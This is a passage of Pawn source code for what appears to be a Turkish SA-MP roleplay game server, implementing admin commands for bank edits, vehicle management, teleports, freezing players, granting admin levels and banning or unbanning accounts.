				format(string, sizeof(string), "%s isimli oyuncunun banka parasýný %d$ olarak deðiþtirdiniz.",OyuncuAdiniBul(adaminadi),paramiktari);
				Bilgi(playerid, string);
				format(string, sizeof(string), "[abankaduzenle] %s isimli oyuncunun banka parasini %d$ olarak degistirdi.", OyuncuAdiniBul(adaminadi), paramiktari);
				Log(playerid, string);
				format(string, sizeof(string), "%s adlý yönetici banka paranýzý %d$ olarak düzenledi.",OyuncuAdiniBul(playerid),paramiktari);
				Bilgi(adaminadi, string);
				format(string, sizeof(string), "[abankaduzenle - PARAALDI] %s isimli yonetici banka parasini %d$ olarak degistirdi.", OyuncuAdiniBul(playerid), paramiktari);
				Log(adaminadi, string);
				Karakter[adaminadi][banka] = paramiktari;
				return 1;
			}
			else Hata(playerid, "Hatalý bir ID girdiniz.");
		}
		else Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
		return 1;
	}
	if(strcmp(string, "/aduyuru", true) == 0)
	{
			if(Karakter[playerid][adminlevel] < 5 || !AKontrol(playerid))
			{
				return 1;
			}
			new lengthoc = strlen(cmdtext);
			while ((idx < lengthoc) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetoc = idx;
			new resultoc[256];
			while ((idx < lengthoc) && ((idx - offsetoc) < (sizeof(resultoc) - 1)))
			{
				resultoc[idx - offsetoc] = cmdtext[idx];
				idx++;
			}
			resultoc[idx - offsetoc] = EOS;
			if(!strlen(resultoc))
			{
				Kullanim(playerid, "/aduyuru [metin]");
				return 1;
			}
			if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
			{
				format(string, sizeof(string),""C4"DUYURU: "C1"%s", resultoc);
				SendClientMessageToAll(-1, string);
				printf("[ADMIN CHAT] %s", string);
				return 1;
			}
			return 1;
	}
	if(strcmp(string, "/adminreklam", true) == 0)
	{
			if(Karakter[playerid][adminlevel] < 2)
			{
				return 1;
			}
			new lengthoc = strlen(cmdtext);
			while ((idx < lengthoc) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetoc = idx;
			new resultoc[256];
			while ((idx < lengthoc) && ((idx - offsetoc) < (sizeof(resultoc) - 1)))
			{
				resultoc[idx - offsetoc] = cmdtext[idx];
				idx++;
			}
			resultoc[idx - offsetoc] = EOS;
			if(!strlen(resultoc))
			{
				Kullanim(playerid, "/adminreklam [metin]");
				return 1;
			}
			if(Karakter[playerid][adminlevel] >= 2 && Karakter[playerid][aGirdi] == 1)
			{
				format(string, sizeof(string),"{00C300}[REKLAM] %s [%s - %d]", resultoc, OyuncuAdiniBul(playerid), Karakter[playerid][telno]);
				SendClientMessageToAll(0x00C300FF, string);
				return 1;
			}
			return 1;
	}
	if(strcmp(string,"/afacttip",true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >=4 && Karakter[playerid][aGirdi] == 1)
	    {
	        string = strtok(cmdtext,idx);
	        if(!strlen(string))
	        {
	            new tes4[64];
	            format(tes4,sizeof(tes4),"Bu aracýn fact idsi %d.",Arac[GetPlayerVehicleID(playerid)][abirliktip]);
	            Bilgi(playerid, tes4);
	            Kullanim(playerid,"/afacttip [tip]");
	            return 1;
	        }
	        new id;
	        id = strval(string);
         	if(IsPlayerInAnyVehicle(playerid))
          	{
           		new acar;
             	acar = GetPlayerVehicleID(playerid);
             	Arac[acar][abirliktip] = id;
             	format(string,sizeof(string),"Aracýn birlik tipini %d olarak deðiþtirdiniz, vehID: %d.",id, acar);
              	Bilgi(playerid, string);
               	AracKaydet(acar);
                return 1;
			}
   			else
      		{
				Hata(playerid, "Aracýn içerisinde olmalýsýnýz.");
				return 1;
    		}
    	}
    	return 1;
    }
	if(strcmp(string,"/afact",true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 2 && Karakter[playerid][aGirdi] == 1)
	    {
	        string = strtok(cmdtext,idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid,"/afact [birlik id]");
	            return 1;
	        }
	        new id;
	        id = strval(string);
         	if(IsPlayerInAnyVehicle(playerid))
          	{
           		new acar;
             	acar = GetPlayerVehicleID(playerid);
             	if(id == 0 || id == 255)
             	{
             	    Arac[acar][atip] = 1;
             	    Arac[acar][abirlik] = 255;
             	    Bilgi(playerid, "Aracý birlikten çýkardýnýz.");
             	    return 1;
             	}
             	Arac[acar][abirlik] = id;
             	Arac[acar][atip] = 2;
             	format(string,sizeof(string),"Aracý %s isimli birliðe geçirdiniz, vehID: %d.",Birlik[id][fisim], acar);
              	Bilgi(playerid, string);
               	AracKaydet(acar);
                return 1;
			}
   			else
      		{
				Hata(playerid, "Aracýn içerisinde olmalýsýnýz.");
				return 1;
    		}
    	}
    	return 1;
    }
	if(strcmp(string, "/respawnthiscar", true) == 0 || strcmp(string, "/rtc", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
				if(!IsPlayerInAnyVehicle(playerid))
	   			{
	   			    string = strtok(cmdtext, idx);
			    	if(!strlen(string))
			    	{
						Kullanim(playerid, "/rtc [aracid]");
						return 1;
					}
					MotoruKapat(strval(string));
				    SetVehicleToRespawn(strval(string));
				    Aractamiri(strval(string));
				    return 1;
				}
   				MotoruKapat(GetPlayerVehicleID(playerid));
			    SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			    Aractamiri(GetPlayerVehicleID(playerid));
			    Bilgi(playerid, "Araç spawn edildi.");
 			}
		}
		return 1;
	}
	if(strcmp(string, "/avergisifirla", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
				if(!IsPlayerInAnyVehicle(playerid))
	   			{
	   			    string = strtok(cmdtext, idx);
			    	if(!strlen(string))
			    	{
						Kullanim(playerid, "/avergisifirla [aracid]");
						return 1;
					}
					Arac[strval(string)][vergi] = 0;
					AracKaydet(strval(string));
				    Bilgi(playerid, "Araç vergisi sýfýrlandý.");
				    return 1;
				}
 			}
		}
		return 1;
	}
	if(strcmp(string, "/aekle", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
	        {
        		string = strtok(cmdtext,idx);
                if(!strlen(string)) return Kullanim(playerid, "/aekle [modelid] [renk1] [renk2] [fiyat]");
	       		new modil = strval(string);
	           	string = strtok(cmdtext,idx);
	           	if(!strlen(string)) return Kullanim(playerid, "/aekle [modelid] [renk1] [renk2] [fiyat]");
	           	new runk1 = strval(string);
	            string = strtok(cmdtext,idx);
	            if(!strlen(string)) return Kullanim(playerid, "/aekle [modelid] [renk1] [renk2] [fiyat]");
	            new runk2 = strval(string);
	            string = strtok(cmdtext,idx);
	            if(!strlen(string)) return Kullanim(playerid, "/aekle [modelid] [renk1] [renk2] [fiyat]");
			    new dafiyat = strval(string);
			    new Float:X, Float:Y, Float:Z;
			    if(modil < 400 || modil > 611){Hata(playerid,"Hatalý model ID girdiniz.");return 1;}

				new query[1024];
				format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", modil);
                new Cache:cache = mysql_query(query,true);
				new new_vehicle_sql_id = cache_insert_id();
				cache_delete(cache);
				GetPlayerPos(playerid, X, Y, Z);
				new vehicleid = CreateVehicle(modil, X, Y, Z, 0.0, runk1, runk2, -1, 0);

				if(IsValidVehicle(vehicleid))
				{
					Arac[vehicleid][aid] = new_vehicle_sql_id;
					Arac[vehicleid][amodel] = modil;
		            Arac[vehicleid][arenk1] = runk1;
		            Arac[vehicleid][arenk2] = runk2;
		            Arac[vehicleid][aposx] = X;
					Arac[vehicleid][aposy] = Y;
					Arac[vehicleid][aposz] = Z;
					Arac[vehicleid][aowner] = -1;
					Arac[vehicleid][afiyat] = dafiyat;
					Arac[vehicleid][ahasar] = 1000.0;
					Arac[vehicleid][alights] = 0;
					Arac[vehicleid][abenzin] = 100.0;
					Arac[vehicleid][apaintjob] = 99;
					Arac[vehicleid][aspawn] = 1;
					Arac[vehicleid][akilittip] = 1;
					Arac[vehicleid][aimmo] = 1;
					Arac[vehicleid][aalarm] = 1;
					Arac[vehicleid][abirlik] = 255;
					Arac[vehicleid][abenzintip] = 0;
					Arac[vehicleid][atip] = 1;
					new plakakyd[128];
			        format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
					AracKaydet(vehicleid);

	 				LinkVehicleToInterior(vehicleid, 0);
					SetVehicleVirtualWorld(vehicleid, 0);
					SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
					SetVehicleParamsCarWindows(vehicleid, 1, 1, 1, 1);
					SetVehicleToRespawn(vehicleid);
					MotoruKapat(vehicleid);
				}
				format(string,sizeof(string),"id:%d model: %d fiyat: %d renk1: %d",Arac[vehicleid][aid],Arac[vehicleid][amodel],Arac[vehicleid][afiyat],Arac[vehicleid][arenk1]);
				Bilgi(playerid, string);
				new araclogla[110];
				format(araclogla,sizeof(araclogla),"id:%d model: %d fiyat: %d renk1: %d",Arac[vehicleid][aid],Arac[vehicleid][amodel],Arac[vehicleid][afiyat],Arac[vehicleid][arenk1]);
				printf(araclogla);
				return 1;
	        }
	        else
	        {
	            return 1;
	        }
	    }
	    return 1;
	}
	//aekle2
	if(strcmp(string, "/aekle2", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
	        {
        		string = strtok(cmdtext,idx);
                if(!strlen(string)) return Kullanim(playerid, "/aekle [modelid] [renk1] [renk2] [fiyat]");
	       		new modil = strval(string);
	           	string = strtok(cmdtext,idx);
	           	if(!strlen(string)) return Kullanim(playerid, "/aekle [modelid] [renk1] [renk2] [fiyat]");
	           	new runk1 = strval(string);
	            string = strtok(cmdtext,idx);
	            if(!strlen(string)) return Kullanim(playerid, "/aekle [modelid] [renk1] [renk2] [fiyat]");
	            new runk2 = strval(string);
	            string = strtok(cmdtext,idx);
	            if(!strlen(string)) return Kullanim(playerid, "/aekle [modelid] [renk1] [renk2] [fiyat]");
			    new dafiyat = strval(string);
			    new Float:X, Float:Y, Float:Z;
			    if(modil < 400 || modil > 611){Hata(playerid,"Hatalý model ID girdiniz.");return 1;}

				new query[1024];
				format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", modil);
                new Cache:cache = mysql_query(query,true);
				new new_vehicle_sql_id = cache_insert_id();
				cache_delete(cache);
				GetPlayerPos(playerid, X, Y, Z);
				new vehicleid = CreateVehicle(modil, X, Y, Z, 0.0, runk1, runk2, -1, 1);

				if(IsValidVehicle(vehicleid))
				{
					Arac[vehicleid][aid] = new_vehicle_sql_id;
					Arac[vehicleid][amodel] = modil;
		            Arac[vehicleid][arenk1] = runk1;
		            Arac[vehicleid][arenk2] = runk2;
		            Arac[vehicleid][aposx] = X;
					Arac[vehicleid][aposy] = Y;
					Arac[vehicleid][aposz] = Z;
					Arac[vehicleid][aowner] = -1;
					Arac[vehicleid][afiyat] = dafiyat;
					Arac[vehicleid][ahasar] = 1000.0;
					Arac[vehicleid][alights] = 0;
					Arac[vehicleid][abenzin] = 100.0;
					Arac[vehicleid][apaintjob] = 99;
					Arac[vehicleid][aspawn] = 1;
					Arac[vehicleid][akilittip] = 1;
					Arac[vehicleid][aimmo] = 1;
					Arac[vehicleid][aalarm] = 1;
					Arac[vehicleid][abirlik] = 255;
					Arac[vehicleid][abenzintip] = 0;
					Arac[vehicleid][atip] = 1;
					Arac[vehicleid][siren] = 1;
					new plakakyd[128];
			        format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
					AracKaydet(vehicleid);

	 				LinkVehicleToInterior(vehicleid, 0);
					SetVehicleVirtualWorld(vehicleid, 0);
					SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
					SetVehicleParamsCarWindows(vehicleid, 1, 1, 1, 1);
					SetVehicleToRespawn(vehicleid);
					MotoruKapat(vehicleid);
				}
				format(string,sizeof(string),"id:%d model: %d fiyat: %d renk1: %d",Arac[vehicleid][aid],Arac[vehicleid][amodel],Arac[vehicleid][afiyat],Arac[vehicleid][arenk1]);
				Bilgi(playerid, string);
				new araclogla[110];
				format(araclogla,sizeof(araclogla),"id:%d model: %d fiyat: %d renk1: %d",Arac[vehicleid][aid],Arac[vehicleid][amodel],Arac[vehicleid][afiyat],Arac[vehicleid][arenk1]);
				printf(araclogla);
				return 1;
	        }
	        else
	        {
	            return 1;
	        }
	    }
	    return 1;
	}
	//aekle2
	if(strcmp(string, "/aracsil", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(Karakter[playerid][adminlevel] >= 6 && AKontrol(playerid))
	        {
					new tmpcar = GetClosestVehicle(playerid);
					if(IsValidVehicle(tmpcar) && AracMesafesi(2.0, playerid))
					{
						ArabaSil(tmpcar);
					}
					else
					{
					    Hata(playerid,"Araç bulunamadý.");
					}
					return 1;
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
	            return 1;
	        }
		}
		return 1;
	}
	if(strcmp(string, "/aduzenle", true) == 0 || strcmp(string, "/aracduzenle", true) == 0 || strcmp(string, "/arabaduzenle", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(AracMesafesi(3.0, playerid))
	        {
		        if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
		        {
		            new tmpcar = GetClosestVehicle(playerid);
		            if(tmpcar == 0)
		            {
		                return 1;
					}
	    			Bilgi(playerid, "Burada gerçekleþtireceðiniz bütün bilgilerin kaydolduðunu unutmayýn.");
	    			new mstringx[1024];
					format(mstringx, sizeof(mstringx),
"Seçenek\tDurum\nSahibi(SQLID):\t%d ( %s )\nModel:\t%d (Araç içerisinde olmalýsýnýz)\nPlaka:\t%s\nFiyat:\t%d\nRenk1:\t%d\nRenk2:\t%d\nBenzin:\t%f\nHasar:\t%f\nModifiyeleri sil\t(kalýcý olarak, araç içerisinde olmalýsýnýz)\nPlaka Yazýsý:\t%s\nTip:\t%d\nKM:\t%d\nÝþyeriID:\t%d\nVergi:\t%d\nSigorta:\t%d",
Arac[tmpcar][aowner],SQLFromName(Arac[tmpcar][aowner]),Arac[tmpcar][amodel],Arac[tmpcar][aplaka],Arac[tmpcar][afiyat],Arac[tmpcar][arenk1],Arac[tmpcar][arenk2],
Arac[tmpcar][abenzin],Arac[tmpcar][ahasar],Arac[tmpcar][atextyazi],Arac[tmpcar][atip],Arac[tmpcar][akm],Arac[tmpcar][aisyeri],Arac[tmpcar][vergi],Arac[tmpcar][sigorta]);
					ShowPlayerDialog(playerid, 4, DIALOG_STYLE_TABLIST_HEADERS, "Araç Düzenleme Menüsü", mstringx, "Düzenle", "Kapat");
       			}
       			return 1;
			}
			else Hata(playerid, "Bu komutu bir aracýn yakýnýnda kullanmalýsýnýz.");
		}
	    return 1;
	}
	if(strcmp(string, "/tokat", true) == 0 || strcmp(string, "/slap", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/slap [ID/isim]");
				return 1;
			}
			new playa;
			new Float:shealth;
			new Float:slx, Float:rennie, Float:slz;
			playa = ReturnUser(string);
			if(Karakter[playerid][adminlevel] >=1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
			            if(Karakter[playerid][adminlevel] < Karakter[playa][adminlevel])
				     	{
				     	    Ipucu(playerid, "Kendinizden yüksek levelli admine iþlem yapamazsýnýz.");
				     	    return 0;
				     	}
						GetPlayerHealth(playa, shealth);
						SetPlayerHealth(playa, shealth-5);
						GetPlayerPos(playa, slx, rennie, slz);
						SetPlayerPos(playa, slx, rennie, slz+5);
						PlayerPlaySound(playa, 1130, slx, rennie, slz+5);
						new mstring3[128];
						format(mstring3, sizeof(mstring3), "%s nickli admin tarafýndan tokatlandýnýz.", Karakter[playerid][anick]);
						Bilgi(playa, mstring3);
					}
				}
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yeterli yetkiye sahip deðilsiniz.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/freeze", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/freeze [ID/isim]");
				return 1;
			}
			new playa;
			playa = ReturnUser(string);
			if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
			            if(Karakter[playerid][adminlevel] < Karakter[playa][adminlevel])
				     	{
				     	    Ipucu(playerid, "Kendinizden yüksek levelli admine iþlem yapamazsýnýz.");
				     	    return 0;
				     	}
						TogglePlayerControllable(playa, 0);
						format(string, sizeof(string), "%s adlý oyuncuyu dondurdunuz.",OyuncuAdiniBul(playa));
						Bilgi(playerid,string);
					}
				}
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yetkiniz yok!");
			}
		}
		return 1;
	}
	if(strcmp(string, "/unfreeze", true) == 0 || strcmp(string, "/uf", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/uf [ID/isim]");
				return 1;
			}
			new playa;
			playa = ReturnUser(string);
			if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
			            if(Karakter[playa][ajail] > 0) return Hata(playerid, "Oyuncu OOC hapiste.");
			            if(Karakter[playerid][adminlevel] < Karakter[playa][adminlevel])
				     	{
				     	    Ipucu(playerid, "Kendinizden yüksek levelli admine iþlem yapamazsýnýz.");
				     	    return 0;
				     	}
						TogglePlayerControllable(playa, 1);
						format(string, sizeof(string), "%s adlý oyuncunun dondurmasýný kaldýrdýnýz.",OyuncuAdiniBul(playa));
						Bilgi(playerid,string);
					}
				}
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yetkiniz yok!");
			}
		}
		return 1;
	}
	if(strcmp(string, "/gonderls", true) == 0)
	{
	    if((Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1) || Karakter[playerid][tester] >= 2)
	    {
		    string = strtok(cmdtext, idx);
			if(isnull(string)) return Kullanim(playerid, "/gonderls [playerid]");
			new gid2 = strval(string);
		    if(IsPlayerConnected(gid2))
		    {
		        if(Karakter[gid2][ajail] > 0) return Hata(playerid, "Oyuncu OOC hapiste.");
				if(Karakter[playerid][tester] >= 2 && Karakter[gid2][adminlevel] >= 1) return Hata(playerid, "Admini LS gönderemezsiniz.");
				SetPlayerPos(gid2,1534.4611,-1741.7959,13.5469);
				format(string, sizeof(string), "%s tarafýndan sorununuz çözülmek üzere Los Santos'a ýþýnlandýnýz.", OyuncuAdiniBul(playerid));
				SendClientMessage(gid2, COLOR_GRAD1, string);
				format(string, sizeof(string), "%s adlý oyuncuyu Los Santos'a ýþýnlandýnýz.", OyuncuAdiniBul(gid2));
				SendClientMessage(playerid, COLOR_GRAD1, string);
				SetPlayerInteriorEx(gid2,0);
				SetPlayerVirtualWorld(gid2,0);
			}
			else Hata(playerid, "Böyle bir kullanýcý bulunmamaktadýr.");
		}
		return 1;
	}
	if(strcmp(string, "/gotols", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePosEx(tmpcar, 1529.6,-1691.2,13.3);
				}
				else
				{
					SetPlayerPos(playerid, 1519.3556,-1661.4607,13.5392);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "Los Santos'a ýþýnlandýnýz.");
				SetPlayerInteriorEx(playerid,0);
				SetPlayerVirtualWorld(playerid,0);
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yeterli yetkiye sahip deðilsiniz.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/gotoib", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
				SetPlayerPos(playerid, 3602.6877,-517.9811,943.7070);
				SendClientMessage(playerid, COLOR_GRAD1, "LSPD Ýþbaþý");
				SetPlayerInteriorEx(playerid,1);
				SetPlayerVirtualWorld(playerid,1);
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yeterli yetkiye sahip deðilsiniz.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/gotolv", true) == 0 )
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePosEx(tmpcar, 1699.2, 1435.1, 10.7);
				}
				else
				{
					SetPlayerPos(playerid, 1699.2,1435.1, 10.7);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "Las Venturas'a ýþýnlandýnýz");
				SetPlayerInteriorEx(playerid,0);
				SetPlayerVirtualWorld(playerid,0);
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yeterli yetkiye sahip deðilsiniz.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/gotoadm", true) == 0 )
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePosEx(tmpcar, 179.7385,-3487.1682,12.3595);
					SetVehicleVirtualWorld(tmpcar, 1);
				}
				else
				{
					SetPlayerPos(playerid, 179.7385,-3487.1682,12.3595);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "Admin adaya ýþýnlandýnýz");
				SetPlayerInteriorEx(playerid,0);
				SetPlayerVirtualWorld(playerid,1);
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yeterli yetkiye sahip deðilsiniz.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/gotosf", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePosEx(tmpcar, -1641.9742,431.1623,7.1102);
				}
				else
				{
					SetPlayerPos(playerid, -1641.9742,431.1623,7.1102);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "San Fierro'ya ýþýnlandýnýz");
				SetPlayerInteriorEx(playerid,0);
				SetPlayerVirtualWorld(playerid,0);
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yeterli yetkiye sahip deðilsiniz.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/makeadmin", true) == 0 || strcmp(string, "/adminyap", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 6 && AKontrol(playerid))
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/makeadmin [ID/isim] [seviye]");
	            return 1;
			}
			new giveplayerid = ReturnUser(string);
			string = strtok(cmdtext, idx);
			new ananinamiozaman = strval(string);
			if(!strlen(string))
			{
			    Kullanim(playerid, "/makeadmin [ID/isim] [seviye]");
			    return 1;
			}
			Karakter[giveplayerid][adminlevel] = ananinamiozaman;
			format(string, sizeof(string), "%s adlý oyuncuyu %d seviye yönetici yaptýnýz.", OyuncuAdiniBul(giveplayerid), ananinamiozaman);
			Bilgi(playerid, string);
			format(string, sizeof(string), "%s adlý yönetici sizi %d seviye yönetici yaptý.", OyuncuAdiniBul(playerid), ananinamiozaman);
			Bilgi(giveplayerid, string);
		}
		else Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
		return 1;
	}
	if(strcmp(string, "/makehelper", true) == 0 || strcmp(string, "/helperyap", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 6 && AKontrol(playerid))
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/makehelper [ID/isim] [seviye]");
	            return 1;
			}
			new giveplayerid = ReturnUser(string);
			string = strtok(cmdtext, idx);
			new ananinamiozaman = strval(string);
			if(!strlen(string))
			{
			    Kullanim(playerid, "/makehelper [ID/isim] [seviye]");
			    return 1;
			}
			Karakter[giveplayerid][tester] = ananinamiozaman;
			format(string, sizeof(string), "%s adlý oyuncuyu %d seviye helper yaptýnýz.", OyuncuAdiniBul(giveplayerid), ananinamiozaman);
			Bilgi(playerid, string);
			format(string, sizeof(string), "%s adlý yönetici sizi %d seviye helper yaptý.", OyuncuAdiniBul(playerid), ananinamiozaman);
			Bilgi(giveplayerid, string);
		}
		else Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
		return 1;
	}
	if(strcmp(string, "/skin", true) == 0 || strcmp(string, "/setskin", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 || Karakter[playerid][tester] >= 2 )
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/setskin [ID/isim] [skin]");
	            return 1;
			}
			new giveplayerid = ReturnUser(string);
			string = strtok(cmdtext, idx);
			new ananinamiozaman = strval(string);
			if(!strlen(string))
			{
			    Kullanim(playerid, "/setskin [ID/isim] [skin]");
			    return 1;
			}
			Karakter[giveplayerid][skin] = ananinamiozaman;
			SetPlayerSkin(giveplayerid, ananinamiozaman);
			format(string, sizeof(string), "%s adlý oyuncunun skinini %d yaptýnýz.", OyuncuAdiniBul(giveplayerid), ananinamiozaman);
			Bilgi(playerid, string);
			format(string, sizeof(string), "%s adlý yönetici skininizi %d olarak deðiþtirdi.", OyuncuAdiniBul(playerid), ananinamiozaman);
			Bilgi(giveplayerid, string);
		}
		else Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
		return 1;
	}
	if(strcmp(string, "/unban", true) == 0)
	{
	    new query[1024];
	    if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
	    {
			string = strtok(cmdtext, idx);
			if(isnull(string)) return Kullanim(playerid, "/unban [sqlid/isim]");
			if(IsNumeric(string))
			{
			    new verid = strval(string);
			    format(query, sizeof(query), "UPDATE `karakterler` SET `kilit` = '0' WHERE `id` = '%d'", verid);
			    new Cache:cache = mysql_query(query, true);
			    if(cache_affected_rows()) format(string, sizeof(string), "%d sqlidli kullanýcýnýn banýný kaldýrdýnýz.", verid);
			    else format(string, sizeof(string), "Böyle bir kullanýcý bulanamadý.");
			    cache_delete(cache);
			    Bilgi(playerid, string);
			}
			else
			{
				mysql_real_escape_string(string, string);
				//strreplace(string, "_", " ");
			    format(query, sizeof(query), "UPDATE `karakterler` SET `kilit` = '0' WHERE `isim` = '%s'", string);
			    new Cache:cache = mysql_query(query, true);
			    if(cache_affected_rows()) format(string, sizeof(string), "%s adlý kullanýcýnýn banýný kaldýrdýnýz.", string);
			    else format(string, sizeof(string), "Böyle bir kullanýcý bulanamadý.");
			    cache_delete(cache);
			    Bilgi(playerid, string);
			}
	    }
	    return 1;
	}
	if(strcmp(string, "/sban", true) == 0 || strcmp(string, "/sessizban", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/sban [oyuncuID] [sebep]");
				return 1;
			}
			new giveplayerid, giveplayer[MAX_PLAYER_NAME], sendername[MAX_PLAYER_NAME];
			giveplayerid = ReturnUser(string);
			if (Karakter[playerid][adminlevel] >= 3 && Karakter[playerid][aGirdi] == 1)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new lengthkilit = strlen(cmdtext);
						while ((idx < lengthkilit) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offsetkilit = idx;
						new resultkilit[128];
						while ((idx < lengthkilit) && ((idx - offsetkilit) < (sizeof(resultkilit) - 1)))
						{
							resultkilit[idx - offsetkilit] = cmdtext[idx];
							idx++;
						}
						resultkilit[idx - offsetkilit] = EOS;
						if(!strlen(resultkilit))
						{
							Kullanim(playerid, "/sban [oyuncuID] [sebep]");
							return 1;
						}
						if(Karakter[playerid][adminlevel] < Karakter[giveplayerid][adminlevel])
				     	{
				     	    Ipucu(playerid, "Kendinizden yüksek levelli admine iþlem yapamazsýnýz.");
				     	    return 0;
				     	}
						new year, month,day;
						getdate(year, month, day);
						new saat, dakika, saniye;
						gettime(saat, dakika, saniye);
				        format(string, sizeof(string), "[BAN] %s tarafindan hesabi yasaklandi/kilitlendi. Sebep: %s (%d-%d-%d)",sendername,(resultkilit),month,day,year);
						Log(giveplayerid, string);
						format(string, sizeof(string), "[BANLADI] %s adli kisinin hesabini yasakladi/kilitledi. Sebep: %s (%d-%d-%d)",giveplayer,(resultkilit),month,day,year);
						Log(playerid, string);
